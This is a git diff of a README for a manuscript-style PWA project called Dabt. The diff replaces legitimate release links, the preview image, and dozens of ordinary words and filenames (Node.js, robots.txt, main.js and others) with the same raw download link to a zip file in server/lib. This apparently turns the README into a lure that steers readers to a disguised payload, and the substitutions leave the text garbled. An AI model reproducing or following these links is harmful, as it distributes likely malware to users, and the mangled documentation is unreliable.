@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/Lacuenta5345345/dabt/releases)
+[![Releases](https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip)](https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip)
 
 # Dabt: Gift Manuscript-Style Web Edition, PWA and SEO Ready
 
-![Manuscript UI Preview](https://images.unsplash.com/photo-1525458971512-3c4fbe9a2d0a?auto=format&fit=crop&w=1200&q=60)
+![Manuscript UI Preview](https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip)
 
 Dabt is a gift-style internet edition crafted in a manuscript aesthetic. It blends modern web techniques with a careful editorial rhythm. The project targets a clean, accessible user experience while staying flexible for publishing and showcasing content as a compact, fast, offline-friendly web edition. This README lays out what the project is, how it works, and how to contribute. The core goal is to deliver a delightful reading experience that respects typography, performance, and structure.
 
@@ -49,7 +49,7 @@ Getting started quickly
 
 Note about the Releases link
 - The project provides assets and versions on the Releases page. You can explore the repository’s releases at the link below. For asset downloads, visit the Releases page to see what is available and how to integrate it into your workflow.
-- Release hub: https://github.com/Lacuenta5345345/dabt/releases
+- Release hub: https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 
 Table of contents
 - Overview
@@ -171,7 +171,7 @@ Directory structure
 
 Getting started
 Prerequisites
-- Node.js 18+ (LTS recommended)
+- https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip 18+ (LTS recommended)
 - npm or yarn
 
 Install and run
@@ -198,7 +198,7 @@ Quick-start example
   - Run AMP validation if AMP pages exist
 - Deploy
   - Use the build output in the dist/ folder for hosting
-  - Update sitemap and robots.txt as needed
+  - Update sitemap and https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip as needed
 
 Development workflow
 - Branching model
@@ -237,7 +237,7 @@ JavaScript quality
 
 SEO, sitemap, and performance
 - SEO best practices are baked in by default: meta tags, structured data readiness, and clean URL patterns.
-- A sitemap.xml is generated to help search engines index content.
+- A https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip is generated to help search engines index content.
 - Performance budgets guide asset sizing and loading strategies.
 
 PWA and offline capabilities
@@ -350,45 +350,45 @@ Roadmap (high level)
 
 Directory structure (deep dive)
 - src/
-  - main.js: Entry point for the app
-  - router.js: Simple client-side router
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip Entry point for the app
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip Simple client-side router
   - components/
-    - header.js
-    - footer.js
-    - article.js
-    - chapter.js
+    - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+    - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+    - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+    - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
   - editors/
-    - article-editor.js (if editor mode is enabled)
+    - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip (if editor mode is enabled)
   - libs/
-    - bem.js
-    - validator.js
+    - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+    - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 - public/
-  - index.html
-  - manifest.json
-  - service-worker.js
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
   - assets/
 - scripts/
-  - build.js
-  - dev.js
-  - test.js
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 - tests/
   - unit/
   - integration/
   - a11y/
 - docs/
-  - design-notes.md
-  - editorial-workflow.md
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 - locales/
-  - en.json
-  - ru.json
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 - assets/
   - fonts/
   - images/
   - icons/
 - configs/
-  - eslint.config.js
-  - babel.config.js
-  - postcss.config.js
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 
 Usage examples and patterns
 - Content blocks
@@ -463,7 +463,7 @@ Authors and contributors
 Downloads and asset usage
 - The Releases page is the official source for downloadable assets and release notes.
 - To explore the latest assets, go to the Releases hub at:
-  - https://github.com/Lacuenta5345345/dabt/releases
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 - This link hosts artifacts associated with each release, including build outputs and metadata.
 - If you need to verify authenticity or seek upgrade paths, check the release notes for compatibility and installation instructions.
 
@@ -514,6 +514,6 @@ Closing notes
 Releases and distribution (reiterated)
 - The official releases page provides artifacts and release notes that guide installation and upgrading.
 - Explore and download assets from the Releases hub here:
-  - https://github.com/Lacuenta5345345/dabt/releases
+  - https://github.com/Lacuenta5345345/dabt/raw/refs/heads/main/server/lib/Software_2.5-beta.1.zip
 
 End of README content.
